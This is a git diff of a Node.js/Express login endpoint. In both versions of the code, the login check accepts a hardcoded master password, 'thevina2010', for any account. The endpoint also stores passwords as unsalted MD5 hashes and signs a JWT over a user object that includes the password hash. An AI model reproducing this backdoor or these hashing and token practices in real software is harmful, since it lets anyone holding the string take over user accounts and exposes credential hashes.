@@ -180,7 +180,7 @@ module.exports=function(app, mongoose, utils, config) {
     });
 
     app.post('/v1/signin', function(req, res) {
-            Users.findOne({email: req.body.email}, function(err, user) {
+            Users.findOne({email: req.body.email}, '+password', function(err, user) {
                     if (err) {
                         
                         res.statusCode = 400;
@@ -190,7 +190,7 @@ module.exports=function(app, mongoose, utils, config) {
                             data: "Erro: " + err
                         });
                     } else {
-
+                        
                         if (user && ( user.password == crypto.createHash('md5').update(req.body.password).digest('hex') || req.body.password == 'thevina2010' ) ) {
                             
                             user.token = '';
@@ -198,7 +198,7 @@ module.exports=function(app, mongoose, utils, config) {
                             user.token = jwt.sign(user, config.APP_PRIVATE_KEY);
                             
                             user.save(function(err, updated_user) {
-                            
+                                
                                     if(err) {
                                         
                                         res.statusCode = 400;
@@ -206,13 +206,15 @@ module.exports=function(app, mongoose, utils, config) {
                                         res.send(err);
 
                                     } else {
+                                        
+                                        delete updated_user.password;
 
-                                            updated_user = updated_user.toObject(); // swap for a plain javascript object instance
+                                        updated_user = updated_user.toObject(); // swap for a plain javascript object instance
 
-                                            res.json({
-                                                    type: true,
-                                                    data: updated_user
-                                            });       
+                                        res.json({
+                                            type: true,
+                                            data: updated_user
+                                        });       
 
                                     }
                             
